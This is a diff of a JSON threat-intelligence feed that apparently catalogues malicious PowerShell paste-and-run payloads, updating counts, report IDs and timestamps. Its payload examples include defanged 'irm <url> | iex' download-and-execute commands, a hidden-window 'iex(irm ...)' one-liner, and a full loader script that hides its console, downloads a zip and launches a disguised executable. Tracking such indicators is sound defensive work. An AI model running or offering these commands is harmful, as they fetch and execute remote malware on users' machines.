@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 79,
-    "ReportCount": 79,
+    "DistinctPayloadCount": 81,
+    "ReportCount": 81,
     "FirstSeen": "2026-11-19T23:19:43.828000+00:00",
-    "LastSeen": "2026-11-26T15:26:02.717000+00:00",
+    "LastSeen": "2026-11-26T20:26:33.895000+00:00",
     "ReportIds": [
       "cmwo6a5551xu40omla5b849lo",
       "cmwo9kdgz1ys80omlr22sxrni",
@@ -84,7 +84,9 @@
       "cmwwz4un60b1n0omlxioear0m",
       "cmwwzg4sn0bf20oml6olafw5a",
       "cmwxozekr0ff00oml1mrfdppx",
-      "cmwxpfxxr0fi30omlvtp74p8o"
+      "cmwxpfxxr0fi30omlvtp74p8o",
+      "cmwxzs7ov0fty0omll0s1pyq1",
+      "cmwy06ewh0g780omlgqj6ta51"
     ],
     "PayloadExamples": [
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/023cf003bfe9c9b9')|iex",
@@ -164,8 +166,10 @@
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/6e127be45e3ae0a7')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/6e377c27970e7c39')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/96a5a2fe13040cc4')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/b7b870665eb09f18')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/ee0a397ab22d5ac6')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/f23dfa65aa0d4c27')|iex"
+      "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/f23dfa65aa0d4c27')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/f4067b9e6f78715e')|iex"
     ]
   },
   {
@@ -372,9 +376,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 11,
-    "ReportCount": 40,
+    "ReportCount": 41,
     "FirstSeen": "2026-11-20T01:25:30.403000+00:00",
-    "LastSeen": "2026-11-26T17:24:43.995000+00:00",
+    "LastSeen": "2026-11-26T20:14:30.408000+00:00",
     "ReportIds": [
       "cmwoarw6c1ytk0omlfgbkqvw7",
       "cmwoauwbm1yu70oml45lo3jkx",
@@ -415,7 +419,8 @@
       "cmwwhss5u0jtf0nmlt7brl6jz",
       "cmwx13u170dae0omlmlgsvgxf",
       "cmwxcbz2i0eq80omlzv5b0dii",
-      "cmwxtokrh0fqu0omlscdxk3zw"
+      "cmwxtokrh0fqu0omlscdxk3zw",
+      "cmwxzqwn00fsp0omlt2fpw17t"
     ],
     "PayloadExamples": [
       "IRM fozeenyqzeokeeqh[.]sisterleveling[.]com/4d9a40aa-2dcd-4623-8ab8-8b7ec2355fcb/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX",
@@ -580,6 +585,23 @@
     ]
   },
   {
+    "Pattern": "powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 5,
+    "FirstSeen": "2026-11-24T18:33:06.136000+00:00",
+    "LastSeen": "2026-11-26T20:19:33.103000+00:00",
+    "ReportIds": [
+      "cmwv18snu0a6b0nmlpoa09xzd",
+      "cmwwjla6o00hi0omls2saar36",
+      "cmwwrflwh07q50omlekf5zm7a",
+      "cmwxoht2w0fc80oml53cyksew",
+      "cmwxzxe6v0fw30omliqif8ni7"
+    ],
+    "PayloadExamples": [
+      "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
+    ]
+  },
+  {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
     "ReportCount": 4,
@@ -593,22 +615,6 @@
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
-    ]
-  },
-  {
-    "Pattern": "powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 4,
-    "FirstSeen": "2026-11-24T18:33:06.136000+00:00",
-    "LastSeen": "2026-11-26T14:59:30.123000+00:00",
-    "ReportIds": [
-      "cmwv18snu0a6b0nmlpoa09xzd",
-      "cmwwjla6o00hi0omls2saar36",
-      "cmwwrflwh07q50omlekf5zm7a",
-      "cmwxoht2w0fc80oml53cyksew"
-    ],
-    "PayloadExamples": [
-      "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
     ]
   },
   {
